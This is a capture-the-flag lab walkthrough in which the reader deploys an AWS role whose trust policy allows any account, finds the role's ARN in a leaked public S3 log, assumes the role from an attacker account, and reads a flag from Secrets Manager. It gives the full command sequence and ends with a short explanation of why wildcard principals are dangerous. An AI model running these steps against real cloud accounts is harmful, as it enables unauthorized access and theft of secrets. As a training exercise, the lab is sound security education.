# CTF Scenario: The Open Backdoor

A developer named "Dave" was struggling to get Cross-Account access working between the Production and Staging accounts. To troubleshoot, he temporarily set the IAM Role's Trust Policy to allow Any AWS Account ("AWS": "*") to assume it. He fixed the code but forgot to apply the changes. Worse, he accidentally uploaded the deployment log—which contains the Role ARN—to a public S3 bucket meant for hosting a website's assets.

This is a textbook "Cloud Breach" scenario. It highlights how a small information leak (an ARN) combined with a misconfiguration (Wildcard Trust) leads to total compromise.

## Requirements

1.  **Terraform:** You need Terraform installed to deploy the vulnerable infrastructure.
2.  **Victim AWS Account:** An AWS account where you will deploy the Terraform resources. This represents the company's environment.
3.  **Attacker AWS Account:** A separate AWS account that you control. This will be used to assume the vulnerable role. You will need the AWS CLI configured with a profile for this account.

## The Objective

1.  **Recon:** Find the public S3 bucket and download the leaked deployment log.
2.  **Analysis:** Identify the vulnerable Role ARN in the log.
3.  **Exploit:** Assume the role using your own attacker AWS credentials.
4.  **Loot:** Use the assumed credentials to steal the secret flag from AWS Secrets Manager.

## Attack Walkthrough

### Step 1: Deploy the Scenario

1.  Save the provided Terraform code as `main.tf`.
2.  Initialize Terraform in your victim account:
    ```bash
    terraform init
    ```
3.  Deploy the resources:
    ```bash
    terraform apply -auto-approve
    ```
4.  Terraform will output a URL. This is the entry point for the CTF.
    ```
    Outputs:

    leak_bucket_url = "https://dev-deployment-logs-xxxx.s3.amazonaws.com/logs/deploy-2023-10-27.log"
    ```

### Step 2: Discover the Leak

You found the URL from the Terraform output (or through other means like "Google Dorking"). Download the file or view it in your browser to find the leaked ARN.

```bash
# Replace with the URL from the terraform output
curl [URL_FROM_OUTPUT]
```

You will see the content of the log file, which includes the ARN of the vulnerable role:

```
[INFO] 2023-10-27 10:00:12 Starting deployment of Billing Service...
[INFO] 2023-10-27 10:00:15 Creating S3 Buckets... Done.
[WARN] 2023-10-27 10:00:18 Cross-Account Trust Policy set to WILDCARD (*) for debug purposes.
[INFO] 2023-10-27 10:00:19 Created Role: arn:aws:iam::[VICTIM_ACCOUNT_ID]:role/cross-account-billing-role-xxxx
[INFO] 2023-10-27 10:00:20 Deployment Complete.
```

### Step 3: Exploit the Trust Policy

Copy the Role ARN from the log file. Now, using your **Attacker** AWS account's credentials, attempt to assume the role. Because the trust policy allows `Principal: "*"`, any AWS account can assume it.

```bash
# Make sure your AWS CLI is configured with a profile for your attacker account
# Replace the ARN with the one you found in the log
aws sts assume-role \
    --role-arn "arn:aws:iam::[VICTIM_ACCOUNT_ID]:role/cross-account-billing-role-xxxx" \
    --role-session-name pwned-session \
    --profile your-attacker-profile-name
```

### Step 4: Configure Environment for Looting

The `assume-role` command returns temporary credentials (AccessKeyId, SecretAccessKey, SessionToken). Export these to your terminal session. You are now effectively operating within the victim's account with the permissions of the assumed role.

```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
```

### Step 5: Loot the Secret

With the temporary credentials active, you can now interact with the victim's AWS environment.

1.  List the secrets to find the one we are looking for:
    ```bash
    aws secretsmanager list-secrets
    ```

2.  Retrieve the secret value to get the flag:
    ```bash
    # Replace with the Secret ARN or Name from the list-secrets output
    aws secretsmanager get-secret-value --secret-id [SECRET_ARN_OR_NAME]
    ```

The result will contain the flag:
`FLAG{NEVER_TRUST_WILDCARD_PRINCIPALS}`

---

## 🛡️ Why is this Dangerous?

A wildcard in the Principal field of an IAM Role's Trust Policy (`"AWS": "*"`) effectively disables authentication for that role. It turns the role into a public resource. Any user with any AWS account (which anyone can create for free) who knows the ARN of the role can assume it and gain the permissions granted to it.

This creates a massive security hole, allowing unauthorized access to your internal AWS resources.
